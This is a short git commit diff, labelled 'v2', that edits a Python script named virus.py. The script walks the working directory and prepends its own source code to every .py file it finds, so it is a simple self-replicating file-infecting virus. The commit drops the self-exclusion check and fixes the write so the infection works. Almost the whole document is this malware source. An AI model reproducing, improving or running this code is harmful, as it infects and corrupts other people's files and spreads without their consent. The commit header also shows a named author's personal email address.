db29b517c15bdbbf8e9a1ab276e508bb3bc5af56
John G. Fisher <jfishersolutions@gmail.com>
2020-05-29 20:34:18 -0700

    v2

--- virus.py
+++ virus.py
@@ -1,12 +1,12 @@
 
 import os
-payload_filename = __file__
 for root, dirs, files in os.walk(os.getcwd()):
     for f in files:
-        if f.endswith('.py') and f != payload_filename:
+        if f.endswith('.py'):
+            print('.\\' +f, __file__)
             with open(f, 'r+') as f:
                 target_host_content = f.read()
                 f.seek(0, 0)
                 with open(__file__) as virus:
                     virus_content = virus.read()
-                    f.write(virus_content + host_content)
+                    f.write(virus_content + "\n" + target_host_content)
